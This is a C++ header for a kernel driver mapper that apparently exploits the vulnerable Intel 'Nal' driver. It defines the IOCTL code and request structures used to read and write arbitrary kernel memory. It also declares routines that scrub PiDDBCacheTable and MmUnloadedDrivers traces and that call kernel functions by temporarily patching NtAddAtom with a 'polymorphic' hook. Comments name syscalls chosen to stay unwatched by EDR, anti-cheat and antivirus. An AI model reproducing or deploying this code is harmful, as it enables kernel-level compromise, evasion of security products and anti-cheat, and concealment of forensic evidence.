#pragma once

#include "Common.hpp"
#include "Win.hpp"
#include <ntstatus.h>




// Intel driver
constexpr auto DEVICE_NAME = L"\\\\.\\Nal";


// Unique IOCTL code needed for the exploit, dispatch is handled by the Intel driver via case_number field. 
constexpr ULONG32 ioctl1 = 0x80862007;


// Correspondig case numbers to pass to deviceIoControl.
enum IOCTL_CASE_NUMBER
{
	COPY_MEMORY_BUFF_INFO = 0x33,
	FILL_MEMORY_BUFF_INFO = 0x30,
	GET_PHYS_ADDRESS_BUFF_INFO = 0x25,
	MAP_IO_SPACE_BUFF_INFO = 0x19,
	UNMAP_IO_SPACE_BUFF_INFO = 0x1A
};


// IOCTL Commands Structs
typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

typedef struct _FILL_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint32_t value;
	uint32_t reserved2;
	uint64_t destination;
	uint64_t length;
}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;

}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;


struct SyscallGate
{
	const char* userModeName;      
	const char* kernelModeName;   
};

// That's enough for now. Except NtAddAtom wich is probably watched now by EDR/AC/AV because of KDMapper 
// the rest are unwatched and rarely used. No races, no problems :).
// Feeling cute and oldschool today, using C style inline array :3.
inline const SyscallGate cleanSysGates[] = {
	{ "NtYieldExecution", "ZwYieldExecution" },
	{ "NtQueryTimerResolution", "ZwQueryTimerResolution" },
	{ "NtAddAtom", "NtAddAtom" },
	{ "NtSetTimerResolution", "ZwSetTimerResolution" },
};

// Not impl yet.
inline const SyscallGate& PickRandomGate()
{
	
}




class IntelLoader
{
private:
	HANDLE hIntelDriver;
	UINT64 ntoskrnlBaseAddress = 0;



public:
	IntelLoader();
	~IntelLoader();

	/* Intel driver management */
	std::wstring GetDriverPath();
	std::wstring GetDriverName();
	BOOL LoadVulnDriver();
	BOOL UnloadVulnDriver();
	BOOL OpenDevice();




	/* Memory & resources management */
	BOOL MemoryCopy(uint64_t destination, uint64_t source, uint64_t size);
	BOOL SetMemory(uint64_t address, uint32_t value, uint64_t size);
	BOOL GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
	UINT64 MapIoSpace(uint64_t physical_address, uint32_t size);
	BOOL UnmapIoSpace(uint64_t address, uint32_t size);
	BOOL ReadMemory(uint64_t address, void* buffer, uint64_t size);
	BOOL WriteMemory(uint64_t address, void* buffer, uint64_t size);
	BOOL WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);
	BOOL ExFreePool(uint64_t address);
	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	BOOLEAN MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG newProtection);
	BOOL ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN Wait);
	BOOL ExReleaseResourceLite(PVOID resource);

	// Dead code for now but i might need it later so i'll leave the decl here.
	NTSTATUS ZwQuerySystemInformationKernel(ULONG infoClass, PVOID buffer, ULONG bufSize, PULONG retLen);



	/* PiDDBCacheTable cleaning function */
	PVOID GetPiDDBLock();
	PRTL_AVL_TABLE GetPiDDBCacheTable();

	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID RtlEnumerateGenericTableWithoutSplayingAvl(PRTL_AVL_TABLE Table, PVOID* RestartKey);
	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);


	BOOL ClearMmUnloadedDrivers();


	/* Helpers */
	VOID SetKernelBaseAddress();
	UINT64 GetNtoskrnlBaseAddress() const noexcept;
	UINT64 GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	PVOID ResolveRelativeAddress(PVOID Instruction, ULONG OffsetOffset, ULONG InstructionSize);


	BOOL isValid() const noexcept { return hIntelDriver != INVALID_HANDLE_VALUE && ntoskrnlBaseAddress != 0; }
	HANDLE GetHandle() const { return hIntelDriver; }




		template <typename T, typename... A>
		bool CallKernelFunction(uint64_t KernelBase, T* out_result, uint64_t kernel_function_address, A... arguments)
		{
			constexpr bool is_void = std::is_same_v<T, void>;
			static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments supported");

			std::wcout << L"CallKernelFunction entry\n";

			if constexpr (!is_void)
			{
				if (!out_result)
				{
					std::wcout << L"out_result is null\n";
					return false;
				}
			}

			if (!kernel_function_address)
			{
				std::wcout << L"kernel_function_address is null\n";
				return false;
			}

			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
			if (!ntdll)
			{
				std::wcout << L"GetModuleHandleA(ntdll) failed\n";
				return false;
			}

			const auto NtAddAtomUser = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
			if (!NtAddAtomUser)
			{
				std::wcout << L"GetProcAddress(NtAddAtom) failed\n";
				return false;
			}

			uint64_t kernel_NtAddAtom = GetKernelModuleExport(KernelBase, "NtAddAtom");
			if (!kernel_NtAddAtom)
			{
				std::wcout << L"GetKernelModuleExport(ntoskrnl.NtAddAtom) failed\n";
				return false;
			}

			uint8_t oriNtAddAtomBytes[12] = { 0 };

			std::wcout << L"[DEBUG] Saving original bytes...\n";
			if (!ReadMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12))
			{
				std::wcout << L"[ERROR] Error saving NtAddAtom original prologue!" << std::endl;
				return false;
			}


			std::wcout << L"[DEBUG] Original bytes: ";
			for (int i = 0; i < 12; i++) {
				std::wcout << std::hex << static_cast<int>(oriNtAddAtomBytes[i]) << L" ";
			}
			std::wcout << std::dec << L"\n";


			std::wcout << L"[DEBUG] Original bytes saved successfully\n";

			auto hook_vec = X64Assembler::PolymorphicHook(kernel_function_address, 12);

		
			std::wcout << L"[DEBUG] Hook generated, size: " << hook_vec.size() << L" bytes\n";
			std::wcout << L"[DEBUG] Hook bytes: ";
			for (size_t i = 0; i < hook_vec.size() && i < 20; i++) {
				std::wcout << std::hex << static_cast<int>(hook_vec[i]) << L" ";
			}
			std::wcout << std::dec << L"\n";

			const uint8_t shellcode_size = static_cast<uint8_t>(hook_vec.size());
			std::wcout << L"[DEBUG] Shellcode size: " << static_cast<int>(shellcode_size) << L"\n";

		


			if (!WriteToReadOnlyMemory(kernel_NtAddAtom, (void*)hook_vec.data(), 12))
			{
				std::wcout << L"[ERROR] WriteToReadOnlyMemory(hook) failed\n";
				return false;
			} 

			std::wcout << L"[DEBUG] Hook written successfully\n";

			// Make the call
			using FunctionFn = T(__stdcall*)(A...);
			const auto fn = reinterpret_cast<FunctionFn>(NtAddAtomUser);

			if constexpr (is_void)
			{
				fn(arguments...);
				std::wcout << L"[DEBUG] Void call completed\n";
			}
			else
			{
				*out_result = fn(arguments...);
				std::wcout << L"[DEBUG] Call returned: " << *out_result << L"\n";
			}

			std::wcout << L"[DEBUG] Restoring original bytes...\n";

			// And finally restore the original bytes.
			const bool restored = WriteToReadOnlyMemory(kernel_NtAddAtom, &oriNtAddAtomBytes, 12);
			if (!restored)
			{
				std::wcout << L"[ERROR] Restore failed\n";
			}
			else
			{
				std::wcout << L"[DEBUG] Restore OK\n";
			}

			std::wcout << L"[DEBUG] Function completed successfully\n";
			return restored;
		}

};
